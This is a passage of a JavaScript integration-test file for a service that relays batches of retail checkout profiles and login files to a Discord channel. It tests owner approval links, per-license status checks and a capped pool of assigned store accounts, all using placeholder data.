    webhookFail.push(0, 500);
    assert.equal((await slots("/submissions", frankKey, { files, name: "Beta", slots: 6, batch })).status, 502);
    assert.equal(webhookPosts.length, before + 1, "the first part went out");
    assert.equal((await slots("/submissions", frankKey, { files, name: "Beta", slots: 6, batch })).status, 200);
    assert.deepEqual(webhookPosts.slice(before + 1).map((m) => m.files.length), [10, 8], "sent again in full");
  });
  console.log("\nApproving batches (2026-10-06; app 1.9.91+ shows it)");
  const approveLink = (content) => (content.match(/\[Approve or decline\]\((http[^)]+\/submissions\/review\/[^)]+)\)/) || [])[1];
  const approvePost = (link, action = "approve") => fetch(link.split("?")[0], { method: "POST", body: new URLSearchParams({ t: new URL(link).searchParams.get("t"), action }) });
  const statusOf = async (key, ids) => { const r = await slots("/submissions/status?ids=" + ids.join(","), key); return r.ok ? (await r.json()).batches : r.status; };
  let apBatch, apLink, apMsg;
  await test("each batch's message ends with an Approve link, and the app hears it's pending", async () => {
    apBatch = "appr" + rid();
    const files = [{ store: "Target", kind: "profiles", text: tgtCsv }, { store: "Target", kind: "logins", text: "kim.target@example.com:pw" }, { store: "Walmart", kind: "profiles", text: wmCsv }];
    const r = await (await slots("/submissions", frankKey, { files, name: "Beta <b>", slots: 2, batch: apBatch, stores: [{ name: "Target", n: 1 }, { name: "Walmart", n: 1, seller: 1 }] })).json();
    assert.deepEqual(r, { ok: true, id: apBatch, review: "pending" });
    apMsg = webhookPosts.at(-1); apLink = approveLink(apMsg.content);
    assert.ok(apLink && apMsg.content.endsWith(`\n⏳ **Pending your approval** · [Approve or decline](${apLink})`), apMsg.content);
    assert.match(apLink, new RegExp(`^${BASE}/submissions/review/${apBatch}\\?t=[A-Za-z0-9_-]{32}$`));
    assert.deepEqual(await statusOf(frankKey, [apBatch]), { [apBatch]: { status: "pending" } });
  });
  await test("only the license that sent a batch hears about it, and asking needs a license", async () => {
    assert.equal(await statusOf(null, [apBatch]), 401);
    assert.equal(await statusOf("PVLT-NOPE-NOPE-NOPE-NOPE", [apBatch]), 401);
    assert.deepEqual(await statusOf(GH_KEY, [apBatch]), {}, "another license gets nothing");
    assert.deepEqual(await statusOf(frankKey, ["unknown" + rid(), "bad id!", apBatch, apBatch]), { [apBatch]: { status: "pending" } }, "unknown and malformed ids are left out");
    assert.deepEqual(await statusOf(frankKey, []), {});
  });
  await test("the review page needs its token, shows the batch (never its slots), and changes nothing by itself", async () => {
    assert.equal((await fetch(apLink.replace(/t=[^&]+/, "t=nope"))).status, 404);
    assert.equal((await approvePost(apLink.replace(/t=[^&]+/, "t=nope"))).status, 404);
    assert.equal((await fetch(`${BASE}/submissions/review/nope?t=x`)).status, 404);
    const html = await (await fetch(apLink)).text();
    assert.match(html, /2 slots from Beta &lt;b&gt;/); assert.match(html, /Target 1 · Walmart 1 \(1 needs an account\)/);
    assert.match(html, /Waiting for you\./); assert.match(html, /Until then their FAFO shows these slots as Pending approval, and after, as Success\./); assert.match(html, /value="approve">Approve</); assert.match(html, /value="decline-ask">Decline</);
    assert.match(html, new RegExp(`Sent by Beta &lt;b&gt; · @frank · license …${frankKey.slice(-4)}, \\d{4}-\\d\\d-\\d\\d \\d\\d:\\d\\d UTC`));
    assert.doesNotMatch(html, /4242424242424242|kim\.target|Kim Lee/, "never the slots themselves");
    assert.deepEqual(await statusOf(frankKey, [apBatch]), { [apBatch]: { status: "pending" } });
  });
  await test("approving marks its message and tells the app, once", async () => {
    const edits = webhookEdits.length, t0 = Date.now();
    const html = await (await approvePost(apLink)).text();
    assert.match(html, /Approved\. Their FAFO now shows these slots as Success\./); assert.doesNotMatch(html, /value="approve"/);
    const st = (await statusOf(frankKey, [apBatch]))[apBatch];
    assert.equal(st.status, "approved"); assert.ok(st.at >= t0 && st.at <= Date.now(), JSON.stringify(st));
    await new Promise((ok) => setTimeout(ok, 300));
    assert.equal(webhookEdits.length, edits + 1);
    const e = webhookEdits.at(-1);
    assert.equal(e.id, apMsg.id);
    assert.equal(e.content, apMsg.content.replace(/\n⏳ [^\n]*$/, `\n✅ **Approved** <t:${Math.floor(st.at / 1000)}:f>`));
    assert.equal(e.allowed_mentions.parse.length, 0);
    assert.match(await (await approvePost(apLink)).text(), /Approved \d{4}-\d\d-\d\d \d\d:\d\d UTC\. Their FAFO shows these slots as Success\./, "approving again changes nothing");
    await new Promise((ok) => setTimeout(ok, 300));
    assert.equal(webhookEdits.length, edits + 1, "and the message isn't edited again");
    assert.deepEqual((await statusOf(frankKey, [apBatch]))[apBatch], st);
  });
  await test("sending an approved batch again says it's approved", async () => {
    const again = await (await slots("/submissions", frankKey, { files: [{ store: "Target", kind: "profiles", text: tgtCsv }], name: "Beta", slots: 2, batch: apBatch })).json();
    assert.equal(again.duplicate, true); assert.equal(again.review, "approved");
  });
  await test("a license lists its own batches (for apps before 1.9.91, which kept no batch id): when, how many, whose, decided", async () => {
    const list = async (key, q = "") => { const r = await slots("/submissions/batches" + q, key); return r.ok ? await r.json() : r.status; };
    assert.equal(await list(null), 401);
    assert.equal(await list("PVLT-NOPE-NOPE-NOPE-NOPE"), 401);
    const t0 = Date.now(), d = await list(frankKey);
    assert.ok(Math.abs(d.now - t0) < 60000, "the worker's clock, to set the app's against");
    const b = d.batches.find((x) => x.id === apBatch);
    assert.ok(b, "the approved batch is listed");
    assert.equal(b.slots, 2); assert.equal(b.name, "Beta <b>"); assert.equal(b.status, "approved");
    assert.ok(b.at > 0 && b.at <= b.decided && b.decided <= t0, JSON.stringify(b));
    assert.deepEqual(Object.keys(b).sort(), ["at", "decided", "id", "name", "slots", "status"], "nothing else: never the slots");
    assert.ok(d.batches.every((x, i) => !i || d.batches[i - 1].at <= x.at), "oldest first");
    assert.ok(d.batches.every((x) => x.status !== "pending" || !("decided" in x)), "a pending batch has no decided time");
    assert.ok(!(await list(GH_KEY)).batches.some((x) => x.id === apBatch), "another license never sees it");
    assert.ok(!(await list(frankKey, `?since=${b.at + 1}`)).batches.some((x) => x.id === apBatch), "since leaves out older ones");
    assert.ok(!(await list(frankKey, `?until=${b.at - 1}`)).batches.some((x) => x.id === apBatch), "until leaves out newer ones");
    assert.ok((await list(frankKey, `?since=${b.at}&until=${b.at}`)).batches.some((x) => x.id === apBatch), "both ends included");
  });
  await test("a batch that never reached the channel has nothing to approve; sending it again posts a new link", async () => {
    const batch = "apfail" + rid(), files = [{ store: "Target", kind: "profiles", text: tgtCsv }];
    webhookFail.push(500);
    assert.equal((await slots("/submissions", frankKey, { files, name: "Beta", slots: 1, batch })).status, 502);
    assert.deepEqual(await statusOf(frankKey, [batch]), {});
    assert.equal((await slots("/submissions", frankKey, { files, name: "Beta", slots: 1, batch })).status, 200);
    assert.deepEqual(await statusOf(frankKey, [batch]), { [batch]: { status: "pending" } });
    assert.ok(approveLink(webhookPosts.at(-1).content).includes(`/submissions/review/${batch}?t=`));
  });
  await test("a batch in several messages has its Approve link on the first", async () => {
    const before = webhookPosts.length, files = [];
    for (let i = 0; i < 6; i++) files.push({ store: "Mall " + i, kind: "profiles", text: tgtCsv }, { store: "Mall " + i, kind: "logins", text: `c${i}@example.com:pw` });
    assert.equal((await slots("/submissions", frankKey, { files, name: "Beta", slots: 6, batch: "apmany" + rid() })).status, 200);
    const posts = webhookPosts.slice(before);
    assert.equal(posts.length, 2); assert.ok(approveLink(posts[0].content)); assert.ok(!approveLink(posts[1].content));
  });
  await test("declining asks first, then marks its message and tells the app; either decision is final", async () => {
    const batch = "decl" + rid(), before = webhookPosts.length;
    assert.equal((await slots("/submissions", frankKey, { files: [{ store: "Target", kind: "profiles", text: tgtCsv }], name: "Beta", slots: 1, batch, stores: [{ name: "Target", n: 1 }] })).status, 200);
    const m = webhookPosts.slice(before).find((x) => x.content.startsWith("📦")), link = approveLink(m.content);
    const ask = await (await approvePost(link, "decline-ask")).text();
    assert.match(ask, /<h2>Decline these slots\?<\/h2>/); assert.match(ask, /Their FAFO will show these slots as Declined, and they can send them again\. This can't be undone\./);
    assert.match(ask, /value="decline">Decline</); assert.match(ask, /<form method="get"><input type="hidden" name="t" value="[A-Za-z0-9_-]{32}"><button[^>]*>Keep it waiting</);
    assert.doesNotMatch(ask, /value="approve"/, "only Decline or keep it waiting");
    assert.deepEqual(await statusOf(frankKey, [batch]), { [batch]: { status: "pending" } }, "asking changes nothing");
    const edits = webhookEdits.length, t0 = Date.now();
    const html = await (await approvePost(link, "decline")).text();
    assert.match(html, /Declined\. Their FAFO now shows these slots as Declined\.<\/p>/); assert.doesNotMatch(html, /value="(approve|decline-ask)"/);
    const st = (await statusOf(frankKey, [batch]))[batch];
    assert.equal(st.status, "declined"); assert.ok(st.at >= t0 && st.at <= Date.now(), JSON.stringify(st));
    await new Promise((ok) => setTimeout(ok, 300));
    assert.equal(webhookEdits.length, edits + 1);
    assert.equal(webhookEdits.at(-1).content, m.content.replace(/\n⏳ [^\n]*$/, `\n⛔ **Declined** <t:${Math.floor(st.at / 1000)}:f>`));
    for (const action of ["approve", "decline", "decline-ask"]) assert.match(await (await approvePost(link, action)).text(), /Declined \d{4}-\d\d-\d\d \d\d:\d\d UTC\. Their FAFO shows these slots as Declined\./);
    assert.match(await (await approvePost(apLink, "decline")).text(), /Approved \d{4}-\d\d-\d\d/, "an approved batch can't be declined");
    await new Promise((ok) => setTimeout(ok, 300));
    assert.equal(webhookEdits.length, edits + 1, "nothing edited again");
    assert.deepEqual((await statusOf(frankKey, [batch, apBatch])), { [batch]: st, [apBatch]: (await statusOf(frankKey, [apBatch]))[apBatch] });
    assert.equal((await statusOf(frankKey, [apBatch]))[apBatch].status, "approved");
    const again = await (await slots("/submissions", frankKey, { files: [{ store: "Target", kind: "profiles", text: tgtCsv }], name: "Beta", slots: 1, batch })).json();
    assert.equal(again.duplicate, true); assert.equal(again.review, "declined");
  });
  await test("admin lists whether each batch is approved, with its Approve link", async () => {
    const d = await (await admin("/admin/submissions")).json();
    const s = d.submissions.find((x) => x.id === apBatch);
    assert.equal(s.review, "approved"); assert.ok(s.decided_at > 0); assert.equal(s.review_url, apLink); assert.equal(s.review_token, undefined);
    assert.ok(d.submissions.every((x) => x.review_token === undefined));
  });
  console.log("\nAssigned accounts (app 1.9.58+)");
  let ginaKey, bobKey, reviewLink;
  const newKey = async (who) => { const r = rid(); await signIn(r, who); const st = await getJson("/discord/status/" + r); assert.equal(st.status, "issued"); return st.key; };
  const offerLink = (content) => (content.match(/\((http[^)]+\/accounts\/review\/[^)]+)\)/) || [])[1];
  const offerPost = (link, action) => fetch(link.split("?")[0], { method: "POST", body: new URLSearchParams({ t: new URL(link).searchParams.get("t"), action }) });
  const pool = Array.from({ length: 13 }, (_, i) => ({ email: `pool${i + 1}@outlook.com`, password: "Test-Pw-1!" }));
  const head = tgtCsv.split("\r\n")[0];
  const slotRow = (name, email) => `${name},${name.split(" ")[0]},${name.split(" ")[1]},${email},5550100,4242424242424242,07,2029,123,"1 Main St, Apt 2",,Austin,TX,78701,US,${name.split(" ")[0]},${name.split(" ")[1]},1 Main St,,Austin,TX,78701,US`;
  const slotCsv = (rows) => [head, ...rows].join("\r\n");
  // The account each row checks out with, from its store's AYCD list (the CSV isn't posted since 2026-10-06).
  const emailsOf = (list) => list.map((x) => x.shippingAddress.email);
  const accounts = async () => (await (await admin("/admin/accounts")).json());
  // Accounts from the one list given out (store "*"): one each, however many of the profile's slots use it (those have rows
  // of their own at their stores, shown as reused).
  const listGiven = (d) => d.given.filter((a) => a.store === "*");
  await test("two licenses for these tests", async () => { ginaKey = await newKey("gina"); bobKey = await newKey("bob"); });
  await test("sending accounts needs a license, a store and email:password pairs", async () => {
    assert.equal((await slots("/accounts/offer", null, { store: "target", accounts: pool })).status, 401);
    for (const body of [{ store: "", accounts: pool }, { store: "Target!", accounts: pool }, { store: "target", accounts: [] }, { store: "target" },
      { store: "target", accounts: [{ email: "nope", password: "x" }] }, { store: "target", accounts: [{ email: "a@b.co", password: "" }] },
      { store: "target", accounts: [{ email: "a@b.co", password: "line\nbreak" }] }])
      assert.equal((await slots("/accounts/offer", ginaKey, body)).status, 400, JSON.stringify(body).slice(0, 70));
  });
  await test("sent accounts wait for the owner: the channel gets the count and a review link, never the accounts", async () => {
    const before = webhookPosts.length;
    const r = await (await slots("/accounts/offer", ginaKey, { store: "target", storeName: "Target", name: "Owner", accounts: [...pool, { ...pool[0], email: "POOL1@outlook.com" }] })).json();
    assert.deepEqual(r, { status: "pending", count: 13 }, "a repeated email counts once");
    await new Promise((ok) => setTimeout(ok, 400));
    assert.equal(webhookPosts.length, before + 1);
    const m = webhookPosts.at(-1).content;
    assert.match(m, /Add 13 accounts to your list for Use Assigned Account\?/, "for Target: on the one list, so no store named"); assert.match(m, /Sent by \*\*Owner\*\* · @gina/);
    assert.doesNotMatch(m, /pool1@|Test-Pw-1/, "no emails or passwords in the channel");
    reviewLink = offerLink(m); assert.ok(reviewLink, m);
    const html = await (await fetch(reviewLink)).text();
    assert.match(html, /pool1@outlook\.com/); assert.doesNotMatch(html, /Test-Pw-1/, "the review page shows emails, never passwords");
    assert.equal((await fetch(reviewLink.replace(/t=[^&]+/, "t=wrong"))).status, 404);
  });
  await test("until the owner adds them, those slots wait for an account, and the AYCD profile goes as sent", async () => {
    const files = [{ store: "Target", storeKey: "target", kind: "profiles", text: slotCsv([slotRow("Ann One", "ann@example.com")]), assigned: 1 }];
    const r = await (await slots("/submissions", ginaKey, { files, name: "Gina", slots: 1, batch: "asg0" + rid(), stores: [{ name: "Target", n: 1, seller: 1 }] })).json();
    assert.deepEqual(r.accounts, { Target: { asked: 1, got: 0 } });
    const m = webhookPosts.at(-1);
    assert.match(m.content, /\nTarget 1 \(1 needs an account: your list has none\)\n/, "and why"); assert.match(m.content, /Profiles that need an account come last\.\n⏳ /);
    assert.deepEqual(plain(m), [], "no logins file"); assert.deepEqual(emailsOf(aycdOf(m)[0]), ["ann@example.com"], "the email as sent");
  });
  await test("adding them from the review link puts them on the list", async () => {
    assert.match(await (await offerPost(reviewLink, "add")).text(), /Added 13 to your list\./);
    await new Promise((ok) => setTimeout(ok, 300));
    const d = await accounts();
    assert.deepEqual(d.stores, [{ store: "*", total: 13, free: 13, sent: 0 }], "on the one list"); assert.equal(d.limit, 10);
    assert.match(webhookEdits.at(-1).content, /Added 13 accounts to your list/);
    assert.match(await (await offerPost(reviewLink, "refuse")).text(), /Added 13 to your list/, "decided: stays added");
    assert.equal(d.offers[0].status, "added"); assert.equal(d.offers[0].accounts, undefined, "the offer no longer holds them");
  });
  let first = [];
  await test("each slot on Use Assigned Account gets its own account: email in its row, email:password in the logins, same order", async () => {
    const files = [
      { store: "Target", storeKey: "target", kind: "profiles", text: slotCsv([slotRow("Kim Lee", "kim@example.com"), slotRow("Ann One", "ann@example.com"), slotRow("Bo Two", "bo@example.com"), slotRow("Cy Three", "cy@example.com")]), assigned: 2 },
      { store: "Target", kind: "logins", text: "kim.target@example.com:pa:ss" },
      { store: "Walmart", storeKey: "walmart", kind: "profiles", text: slotCsv([slotRow("Dee Four", "dee@example.com")]), assigned: 1 }];
    // Target's AYCD list from the app (1.9.87+); Walmart's is made from its CSV.
    const pl = (n, email) => ({ name: n, email, phone: "5550100" });
    files.splice(1, 0, { store: "Target", storeKey: "target", kind: "aycd", text: JSON.stringify(["Kim Lee", "Ann One", "Bo Two", "Cy Three"].map((n) => {
      const e = n.split(" ")[0].toLowerCase() + "@example.com"; return { name: n, notes: "", billingAddress: pl(n, e), shippingAddress: pl(n, e) }; })) });
    const r = await (await slots("/submissions", ginaKey, { files, name: "Gina", slots: 5, batch: "asg1" + rid(),
      stores: [{ name: "Target", n: 4, seller: 2 }, { name: "Walmart", n: 1, seller: 1 }] })).json();
    assert.deepEqual(r.accounts, { Target: { asked: 2, got: 2 }, Walmart: { asked: 1, got: 0 } });
    const m = webhookPosts.at(-1);
    assert.match(m.content, /\nTarget 4 \(2 assigned accounts\) · Walmart 1 \(1 needs an account: your list has none\)\n/);
    const [logF] = plain(m), [tA, wA] = aycdOf(m), em = emailsOf(tA);
    assert.deepEqual(plain(m).map((f) => f.name), ["Gina-target-logins.txt"], "Walmart has no logins file");
    assert.equal(em[0], "kim@example.com"); assert.equal(em[3], "cy@example.com", "other rows as sent");
    assert.ok(/^pool\d+@outlook\.com$/.test(em[1]) && /^pool\d+@outlook\.com$/.test(em[2]) && em[1] !== em[2], em);
    assert.equal(logF.text, `kim.target@example.com:pa:ss\r\n${em[1]}:Test-Pw-1!\r\n${em[2]}:Test-Pw-1!`);
    assert.deepEqual([emailsOf(wA), wA[0].shippingAddress.line1], [["dee@example.com"], "1 Main St, Apt 2"], "no Walmart list: as sent, quoted cells and all");
    assert.deepEqual(tA.map((x) => [x.billingAddress.email, x.shippingAddress.email]), [["kim@example.com", "kim@example.com"], [em[1], em[1]], [em[2], em[2]], ["cy@example.com", "cy@example.com"]],
      "the app's AYCD list gets the same accounts, row for row, on both addresses");
    assert.equal(wA[0].billingAddress.email, "dee@example.com", "Walmart's, made from its CSV, as sent");
    first = [em[1], em[2]];
    const d = await accounts();
    assert.deepEqual(d.stores, [{ store: "*", total: 13, free: 11, sent: 2 }]);
    assert.deepEqual(listGiven(d).map((a) => [a.email, a.key_last4, a.profile, a.store_name]).sort(), [[em[1], ginaKey.slice(-4), "Ann One", "Target"], [em[2], ginaKey.slice(-4), "Bo Two", "Target"]].sort());
    assert.deepEqual(d.given.filter((a) => a.store !== "*").map((a) => [a.store, a.email, a.profile, a.reused]).sort(), [["target", em[1], "Ann One", 1], ["target", em[2], "Bo Two", 1]].sort(),
      "and each slot a row of its own at its store");
  });
  await test("a store with no logins file gets one for its accounts", async () => {
    const files = [{ store: "Target", storeKey: "target", kind: "profiles", text: slotCsv([slotRow("Eve Five", "eve@example.com")]), assigned: 1 }];
    const r = await (await slots("/submissions", ginaKey, { files, name: "Gina", slots: 1, batch: "asg2" + rid(), stores: [{ name: "Target", n: 1, seller: 1 }] })).json();
    assert.deepEqual(r.accounts, { Target: { asked: 1, got: 1 } });
    const m = webhookPosts.at(-1), e = emailsOf(aycdOf(m)[0])[0];
    assert.deepEqual(m.files.map((f) => f.name), ["Gina-target-aycd.json", "Gina-target-shikari.csv", "Gina-target-logins.txt"]);
    assert.equal(csvRows(shikariOf(m)[0].text)[1][3], e, "the Shikari CSV has it in the row's email column");
    assert.equal(plain(m)[0].text, `${e}:Test-Pw-1!`); assert.ok(!first.includes(e), "never one given out before");
    assert.ok(/^pool\d+@outlook\.com$/.test(e) && aycdOf(m)[0][0].billingAddress.email === e, "the AYCD profile made from the CSV has it, on both addresses");
    assert.doesNotMatch(m.content, /need an account/);
  });
  await test("a post that fails puts its accounts back; sending again picks again", async () => {
    const files = [{ store: "Target", storeKey: "target", kind: "profiles", text: slotCsv([slotRow("Fay Six", "fay@example.com")]), assigned: 1 }];
    const batch = "asg3" + rid(), before = (await accounts()).stores[0].free;
    webhookFail.push(500);
    assert.equal((await slots("/submissions", ginaKey, { files, name: "Gina", slots: 1, batch, stores: [{ name: "Target", n: 1, seller: 1 }] })).status, 502);
    assert.equal((await accounts()).stores[0].free, before, "back on the list");
    assert.equal((await slots("/submissions", ginaKey, { files, name: "Gina", slots: 1, batch, stores: [{ name: "Target", n: 1, seller: 1 }] })).status, 200);
    assert.equal((await accounts()).stores[0].free, before - 1);
  });
  await test("if part of a batch went out, its accounts stay with it and sending again posts the same ones", async () => {
    const files = [{ store: "Target", storeKey: "target", kind: "profiles", text: slotCsv([slotRow("Gus Seven", "gus@example.com")]), assigned: 1 }];
    for (let i = 0; i < 5; i++) files.push({ store: "Shop " + i, kind: "profiles", text: tgtCsv }, { store: "Shop " + i, kind: "logins", text: `c${i}@example.com:pw` });
    const batch = "asg4" + rid(), before = webhookPosts.length;
    webhookFail.push(0, 500);
    assert.equal((await slots("/submissions", ginaKey, { files, name: "Gina", slots: 6, batch })).status, 502);
    const sentFirst = emailsOf(aycdOf(webhookPosts[before])[0])[0];
    assert.match(sentFirst, /^pool\d+@outlook\.com$/);
    assert.equal((await slots("/submissions", ginaKey, { files, name: "Gina", slots: 6, batch })).status, 200);
    assert.equal(emailsOf(aycdOf(webhookPosts.at(-2))[0])[0], sentFirst, "the same account");
  });
  await test("a license gets 10 accounts in all; the rest of its slots wait for the owner", async () => {
    const held = listGiven(await accounts()).filter((a) => a.key_last4 === ginaKey.slice(-4)).length;
    assert.equal(held, 5);
    const rows = Array.from({ length: 6 }, (_, i) => slotRow(`Hal H${i}`, `hal${i}@example.com`));
    const files = [{ store: "Target", storeKey: "target", kind: "profiles", text: slotCsv(rows), assigned: 6 }];
    const r = await (await slots("/submissions", ginaKey, { files, name: "Gina", slots: 6, batch: "asg5" + rid(), stores: [{ name: "Target", n: 6, seller: 6 }] })).json();
    assert.deepEqual(r.accounts, { Target: { asked: 6, got: 5 } });
    const m = webhookPosts.at(-2), em = emailsOf(aycdOf(m)[0]);
    assert.match(webhookPosts.at(-1).content, /^⚠️ \*\*Only 3 accounts left\*\* on your list for Use Assigned Account\. Send more from FAFO/, "down to ACCOUNTS_LOW_AT (3 here): the owner is told");
    assert.match(m.content, /\nTarget 6 \(5 assigned accounts, 1 needs an account: this license is at its limit of 10\)\n/, "and why");
    assert.equal(em[5], "hal5@example.com", "the last one keeps its own email");
    assert.equal(plain(m)[0].text.split("\r\n").length, 5, "five login lines, for the first five rows");
    assert.deepEqual(plain(m)[0].text.split("\r\n").map((l) => l.split(":")[0]), em.slice(0, 5), "the logins file has the same emails, row for row");
  });
  await test("at its limit, a profile sent again with its slot switched off still gets back the account it had (app 1.9.99+)", async () => {
    const mine = listGiven(await accounts()).filter((a) => a.key_last4 === ginaKey.slice(-4)), free = (await accounts()).stores[0].free;
    assert.equal(mine.length, 10);
    const hal = mine.find((a) => a.profile === "Hal H0"), before = webhookPosts.length;
    const files = [{ store: "Target", storeKey: "target", kind: "profiles", text: slotCsv([slotRow("Hal H0", "hal0@example.com"), slotRow("Hal H9", "hal9@example.com")]), assigned: 2 }];
    const r = await (await slots("/submissions", ginaKey, { files, name: "Gina", slots: 2, batch: "asg5b" + rid(), stores: [{ name: "Target", n: 2, seller: 2 }], active: { target: ["Hal H1"] } })).json();
    assert.deepEqual(r.accounts, { Target: { asked: 2, got: 1 } });
    const m = webhookPosts.slice(before).find((x) => x.content.startsWith("📦"));
    assert.match(m.content, /\nTarget 2 \(1 assigned account, 1 they had before, 1 needs an account: this license is at its limit of 10\)\n/);
    assert.deepEqual(emailsOf(aycdOf(m)[0]), [hal.email, "hal9@example.com"]); assert.deepEqual(plain(m)[0].text.split("\r\n").map((l) => l.split(":")[0]), [hal.email]);
    assert.equal(listGiven(await accounts()).filter((a) => a.key_last4 === ginaKey.slice(-4)).length, 10, "still 10"); assert.equal((await accounts()).stores[0].free, free);
  });
  await test("a license whose slots were raised can be given that many accounts (2026-10-12)", async () => {
    // At its limit of 10 (the tests' ASSIGNED_LIMIT) until the owner approves more slots: then as many as those.
    assert.equal((await slots("/slots/request", ginaKey, { requested: 21, name: "Gina" })).status, 200);
    const link = slotLink(await new Promise((ok) => setTimeout(() => ok(webhookPosts.at(-1).content), 300)));
    await slotPost(link, "approve");
    assert.equal((await (await slots("/slots/limit", ginaKey)).json()).limit, 21);
    const before = webhookPosts.length;
    const files = [{ store: "Target", storeKey: "target", kind: "profiles", text: slotCsv([slotRow("Jo J0", "jo0@example.com"), slotRow("Jo J1", "jo1@example.com")]), assigned: 2 }];
    const r = await (await slots("/submissions", ginaKey, { files, name: "Gina", slots: 2, batch: "asg5c" + rid(), stores: [{ name: "Target", n: 2, seller: 2 }] })).json();
    assert.deepEqual(r.accounts, { Target: { asked: 2, got: 2 } }, "past 10 now");
    const m = webhookPosts.slice(before).find((x) => x.content.startsWith("📦"));
    assert.match(m.content, /\nTarget 2 \(2 assigned accounts\)\n/);
    const mine = listGiven(await accounts()).filter((a) => a.key_last4 === ginaKey.slice(-4));
    assert.equal(mine.length, 12);
    // As it was for the tests after: those two back on the list, and the slot limit back to the default.
    for (const a of mine.filter((x) => /^Jo J/.test(x.profile))) assert.equal((await admin("/admin/accounts/free", { email: a.email })).status, 200);
    await slotPost(link, "deny");
    assert.equal(listGiven(await accounts()).filter((a) => a.key_last4 === ginaKey.slice(-4)).length, 10);
    // Back at 10: nothing more for it.
    const r2 = await (await slots("/submissions", ginaKey, { files: [{ store: "Target", storeKey: "target", kind: "profiles", text: slotCsv([slotRow("Jo J2", "jo2@example.com")]), assigned: 1 }], name: "Gina", slots: 1, batch: "asg5d" + rid(), stores: [{ name: "Target", n: 1, seller: 1 }] })).json();
    assert.deepEqual(r2.accounts, { Target: { asked: 1, got: 0 } });
  });
  await test("the list running out: the rest wait for an account", async () => {
    assert.equal((await accounts()).stores[0].free, 3);
    const rows = Array.from({ length: 4 }, (_, i) => slotRow(`Ida I${i}`, `ida${i}@example.com`));
    const files = [{ store: "Target", storeKey: "target", kind: "profiles", text: slotCsv(rows), assigned: 4 }];
    const r = await (await slots("/submissions", bobKey, { files, name: "Bob", slots: 4, batch: "asg6" + rid(), stores: [{ name: "Target", n: 4, seller: 4 }] })).json();
    assert.deepEqual(r.accounts, { Target: { asked: 4, got: 3 } });
    assert.equal((await accounts()).stores[0].free, 0);
    assert.match(webhookPosts.at(-1).content, /^🚫 \*\*No accounts left\*\*/, "and told again when it runs out");
    assert.match(webhookPosts.at(-2).content, /^📦 /, "not told it's low a second time");
    const all = listGiven(await accounts()).map((a) => a.email);
    assert.equal(new Set(all).size, all.length, "no account given twice"); assert.equal(all.length, 13);
  });
  await test("pulling a slot tells the owner which account it had", async () => {
    const before = webhookPosts.length;
    const r = await (await pull(ginaKey, { keyId: "CSV", name: "Gina", slots: [{ store: "Target", profile: "Ann One", email: "Assigned account", card: "Visa 4242" }, { store: "Target", profile: "Nobody", email: "Assigned account" }] })).json();
    assert.equal(r.forwarded, true);
    const m = webhookPosts[before].content;
    assert.ok(m.includes(`Target · Ann One · ${first[0]} \\(assigned account\\) · Visa 4242`), m);
    assert.match(m, /Target · Nobody · Assigned account/);
    assert.doesNotMatch(m, /Test-Pw-1/);
  });
  await test("the owner can free an account, or all of a license's, and take one off the list", async () => {
    assert.equal((await admin("/admin/accounts/free", {})).status, 400);
    assert.deepEqual(await (await admin("/admin/accounts/free", { email: first[0].toUpperCase() })).json(), { ok: true, changed: 1 });
    assert.equal((await accounts()).stores[0].free, 1);
    assert.deepEqual(await (await admin("/admin/accounts/free", { key: bobKey })).json(), { ok: true, changed: 3 });
    assert.deepEqual(await (await admin("/admin/accounts/remove", { email: first[0] })).json(), { ok: true, changed: 1 });
    assert.deepEqual((await accounts()).stores, [{ store: "*", total: 12, free: 3, sent: 9 }]);
    assert.ok(!(await accounts()).given.some((a) => a.email === first[0] || a.key_last4 === bobKey.slice(-4)), "nor any slot's row of those");
    assert.equal((await fetch(BASE + "/admin/accounts")).status, 401);
  });
  await test("apps before 1.9.58 (no assigned count) are posted as before", async () => {
    const files = [{ store: "Target", kind: "profiles", text: slotCsv([slotRow("Jo Old", "jo@example.com")]) }];
    const r = await (await slots("/submissions", bobKey, { files, name: "Bob", slots: 1, batch: "asg7" + rid(), stores: [{ name: "Target", n: 1, seller: 1 }] })).json();
    assert.equal(r.accounts, undefined);
    const m = webhookPosts.at(-1);
    assert.match(m.content, /\nTarget 1 \(1 needs an account\)\n/); assert.deepEqual(plain(m), []); assert.deepEqual(emailsOf(aycdOf(m)[0]), ["jo@example.com"]);
  });
  await test("an offer nobody decided on expires, and its accounts are dropped", async () => {
    await slots("/accounts/offer", ginaKey, { store: "nike", storeName: "Nike", accounts: [{ email: "n1@outlook.com", password: "x1" }] });
    await new Promise((ok) => setTimeout(ok, 400));
    const link = offerLink(webhookPosts.at(-1).content);
    await new Promise((ok) => setTimeout(ok, 8200));   // ACCOUNT_OFFER_TTL_MS is 8000 here
    const html = await (await offerPost(link, "add")).text();
    assert.match(html, /Expired before it was added/); assert.doesNotMatch(html, /n1@outlook\.com/);
    assert.ok(!(await accounts()).stores.some((x) => x.store === "nike"), "nothing added");
    assert.equal((await accounts()).offers.find((o) => o.store === "nike").status, "expired");
  });
  await test("once accounts are freed, running out is told again", async () => {
    assert.equal((await accounts()).stores[0].free, 3);
    const rows = Array.from({ length: 3 }, (_, i) => slotRow(`Kay K${i}`, `kay${i}@example.com`));
    const before = webhookPosts.length;
    const r = await (await slots("/submissions", bobKey, { files: [{ store: "Target", storeKey: "target", kind: "profiles", text: slotCsv(rows), assigned: 3 }], name: "Bob", slots: 3, batch: "asg8" + rid(), stores: [{ name: "Target", n: 3, seller: 3 }] })).json();
    assert.deepEqual(r.accounts, { Target: { asked: 3, got: 3 } });
    const after = webhookPosts.slice(before).map((m) => m.content.slice(0, 2));
    assert.deepEqual(after, ["📦", "🚫"], "the batch, then one message that it ran out (not a second one that it's low)");
  });
  await test("refusing sent accounts adds nothing", async () => {
    await slots("/accounts/offer", ginaKey, { store: "walmart", storeName: "Walmart", accounts: [{ email: "w1@outlook.com", password: "x1" }] });
    await new Promise((ok) => setTimeout(ok, 400));
    const link = offerLink(webhookPosts.at(-1).content);
    assert.match(await (await offerPost(link, "refuse")).text(), /Refused\. Nothing was added\./);
    assert.ok(!(await accounts()).stores.some((x) => x.store === "walmart"));
  });
  console.log("\nOne list for Target and Pokémon Center (2026-10-13)");
  // Ivan sends the owner's accounts; Hana is a buyer. Slots on Use Assigned Account come with no email of their own. The
  // tests above left the list with none free, so the accounts sent here are the ones given out.
  let hanaKey, ivanKey;
  const offerAdd = async (key, store, storeName, list, added) => {
    assert.equal((await slots("/accounts/offer", key, { store, storeName, accounts: list })).status, 200);
    await new Promise((ok) => setTimeout(ok, 400));
